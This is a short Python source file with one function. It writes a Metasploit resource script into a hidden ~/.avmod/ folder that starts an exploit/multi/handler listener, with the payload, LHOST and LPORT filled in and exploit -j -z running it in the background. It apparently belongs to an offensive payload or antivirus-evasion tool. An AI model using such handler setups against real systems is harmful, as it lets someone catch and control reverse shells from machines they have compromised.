import datetime
import os
from pathlib import Path


def file(payload, ip, port):
    time_now = str(datetime.datetime.now())
    main_directory = str(Path.home()) + '/.avmod/'

    if os.path.exists(main_directory) is False:
        os.makedirs(main_directory)

    filename = main_directory + 'meta_config_' + time_now
    template = """use exploit/multi/handler
set URIPATCH /
set target 2
set payload {}
set LHOST {}
set LPORT {}
exploit -j -z
""".format(payload, ip, port)

    # Create new file
    new_file = open(filename, 'w')
    new_file.write(template)
    new_file.close()

    return filename
